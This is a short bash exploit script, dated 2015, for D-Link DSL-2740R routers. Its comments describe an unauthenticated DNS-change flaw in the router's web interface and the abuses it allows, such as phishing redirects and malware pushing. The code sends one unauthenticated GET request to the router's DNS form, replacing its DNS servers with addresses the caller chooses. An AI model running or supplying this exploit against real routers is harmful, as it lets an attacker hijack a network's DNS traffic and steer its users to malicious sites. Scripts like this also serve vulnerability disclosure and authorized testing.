#!/bin/bash
#
#  D-Link DSL-2740R Unauthenticated Remote DNS Change Exploit
#
#  Copyright 2015 (c) Todor Donev <todor.donev at gmail.com>
#  http://www.ethical-hacker.org/
#  
#  Description:  
#  Different D-Link Routers are vulnerable to DNS change.
#  The vulnerability exist in the web interface, which is 
#  accessible without authentication. 
#
#  ACCORDING TO THE VULNERABILITY DISCOVERER, MORE D-Link 
#  DEVICES MAY AFFECTED.
#
#  Once modified, systems use foreign DNS servers,  which are 
#  usually set up by cybercriminals. Users with vulnerable 
#  systems or devices who try to access certain sites are 
#  instead redirected to possibly malicious sites.
#  
#  Modifying systems' DNS settings allows cybercriminals to 
#  perform malicious activities like:
#
#    o  Steering unknowing users to bad sites: 
#       These sites can be phishing pages that 
#       spoof well-known sites in order to 
#       trick users into handing out sensitive 
#       information.
#
#    o  Replacing ads on legitimate sites: 
#       Visiting certain sites can serve users 
#       with infected systems a different set 
#       of ads from those whose systems are 
#       not infected.
#   
#    o  Controlling and redirecting network traffic: 
#       Users of infected systems may not be granted 
#       access to download important OS and software 
#       updates from vendors like Microsoft and from 
#       their respective security vendors.
#
#    o  Pushing additional malware: 
#       Infected systems are more prone to other 
#       malware infections (e.g., FAKEAV infection).
#
#     

if [[ $# -gt 3 || $# -lt 2 ]]; then
        echo "     D-Link DSL-2740R Unauthenticated Remote DNS Change Exploit"
        echo "  ================================================================"
        echo "  Usage: $0 <Target> <Preferred DNS> <Alternate DNS>"
        echo "  Example: $0 192.168.1.1 8.8.8.8"
        echo "  Example: $0 192.168.1.1 8.8.8.8 8.8.4.4"
        echo ""
        echo "     Copyright 2015 (c) Todor Donev <todor.donev at gmail.com>"
        echo "                  http://www.ethical-hacker.org/"
        exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
        echo "  Error : libwww-perl not found =/"
        exit;
fi
        GET "http://$1/Forms/dns_1?Enable_DNSFollowing=1&dnsPrimary=$2&dnsSecondary=$3" 0&> /dev/null <&1

